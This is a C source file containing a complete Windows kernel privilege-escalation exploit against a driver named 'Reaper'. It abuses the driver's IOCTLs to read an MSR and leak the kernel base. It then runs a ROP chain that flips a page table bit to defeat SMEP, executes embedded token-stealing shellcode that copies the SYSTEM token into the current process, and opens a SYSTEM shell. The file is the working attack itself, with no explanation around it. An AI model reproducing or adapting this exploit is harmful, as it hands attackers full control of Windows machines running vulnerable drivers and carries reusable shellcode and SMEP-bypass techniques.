#include <stdio.h>
#include <windows.h>

#define IOCTL_EXEC 0x8000200b
#define IOCTL_FREE 0x80002007
#define IOCTL_ALLOC 0x80002003
#define IOCTL_READMSR 0x8000200f

#define REGISTER_LSTAR 0xC0000082
#define OFFSET_KiSystemCall64 0x4363c0

#define QWORD ULONGLONG

typedef struct ReaperData {
    DWORD Magic;
    DWORD ThreadId;
    DWORD Priority;
    DWORD Empty;
    QWORD ExecAddress;
    DWORD SrcRegister;
    QWORD DstAddress;
} ReaperData;

BYTE tokenStealing[64] = {
    0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, // mov rax, [gs:0x188]              ; $rax = _KTHREAD
    0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00,             // mov rax, [rax + 0xb8]            ; $rax = _EPROCESS
    0x50, 0x5b,                                           // mov rbx, rax                     ; $rbx = _EPROCESS
                                                          // .loop:
    0x48, 0x8b, 0x9b, 0x48, 0x04, 0x00, 0x00,             //     mov rbx, [rbx + 0x448]       ; $rbx = ActiveProcessLinks
    0x48, 0x81, 0xeb, 0x48, 0x04, 0x00, 0x00,             //     sub rbx, 0x448               ; $rbx = _EPROCESS
    0x48, 0x83, 0xbb, 0x40, 0x04, 0x00, 0x00, 0x04,       //     cmp qword [rbx + 0x440], 0x4 ; cmp PID to SYSTEM PID
    0x75, 0xe8,                                           //     jnz .loop                    ; if zf == 0 -> loop
    0x48, 0x8b, 0x8b, 0xb8, 0x04, 0x00, 0x00,             // mov rcx, [rbx + 0x4b8]           ; $rcx = SYSTEM token
    0x80, 0xe1, 0xf0,                                     // and cl, 0xf0                     ; clear _EX_FAST_REF struct
    0x48, 0x89, 0x88, 0xb8, 0x04, 0x00, 0x00,             // mov [rax + 0x4b8], rcx           ; store SYSTEM token in _EPROCESS
    0x48, 0x8d, 0x62, 0xe8,                               // lea rsp, [rdx - 0x18]            ; clear stack
    0xc3                                                  // ret                              ; return
};

VOID ExecuteAddress(HANDLE hDevice, QWORD addr) {
    ReaperData userData;

    userData.Magic = 0x6a55cc9e;
    userData.ThreadId = GetCurrentThreadId();
    userData.Priority = 0;
    userData.ExecAddress = addr;

    DeviceIoControl(hDevice, IOCTL_ALLOC, (LPVOID) &userData, sizeof(struct ReaperData), NULL, 0, NULL, NULL);
    DeviceIoControl(hDevice, IOCTL_EXEC, (LPVOID) &userData, sizeof(struct ReaperData), NULL, 0, NULL, NULL);
    DeviceIoControl(hDevice, IOCTL_FREE, (LPVOID) NULL, (DWORD) 0, NULL, 0, NULL, NULL);
}

QWORD ReadMSR(HANDLE hDevice, DWORD reg) {
    QWORD output;
    ReaperData userData;

    userData.Magic = 0x6a55cc9e;
    userData.ThreadId = GetCurrentThreadId();
    userData.Priority = 0;
    userData.SrcRegister = reg;
    userData.DstAddress = (QWORD) &output;

    DeviceIoControl(hDevice, IOCTL_ALLOC, (LPVOID) &userData, sizeof(struct ReaperData), NULL, 0, NULL, NULL);
    DeviceIoControl(hDevice, IOCTL_READMSR, (LPVOID) &userData, sizeof(struct ReaperData), NULL, 0, NULL, NULL);
    DeviceIoControl(hDevice, IOCTL_FREE, (LPVOID) NULL, (DWORD) 0, NULL, 0, NULL, NULL);

    return output;
}

int main() {
    HANDLE hDevice = CreateFileA("\\\\.\\Reaper", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to get handle: 0x%x\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    QWORD KiSystemCall64 = ReadMSR(hDevice, REGISTER_LSTAR);
    QWORD kernelBase = KiSystemCall64 - OFFSET_KiSystemCall64;

    LPVOID shellcode = VirtualAlloc(NULL, sizeof(tokenStealing), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlCopyMemory(shellcode, tokenStealing, sizeof(tokenStealing));

    LPVOID pivot = VirtualAlloc((LPVOID) (0x48000000 - 0x1000), 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    VirtualLock(pivot, 0x10000);

    RtlFillMemory((LPVOID) 0x48000000, 0x28, 'A');
    QWORD *rop = (QWORD *) ((QWORD) 0x48000000 + 0x28);

    *rop++ = kernelBase + 0x2084f6; // pop rcx; ret;
    *rop++ = (QWORD) shellcode;     // Token Stealing
    *rop++ = kernelBase + 0x31e2c4; // MiGetPteAddress
    *rop++ = kernelBase + 0x2084f6; // pop rcx; ret;
    *rop++ = 0x63;                  // U/S bit off (2)
    *rop++ = kernelBase + 0x44b611; // mov [rax], cl; ret;
    *rop++ = kernelBase + 0x38b490; // wbinvd; ret;
    *rop++ = (QWORD) shellcode;     // Token Stealing

    ExecuteAddress(hDevice, kernelBase + 0x3739b0); // mov esp, 0x48000000; add esp, 0x28; ret;
    system("cmd.exe");

    CloseHandle(hDevice);
}
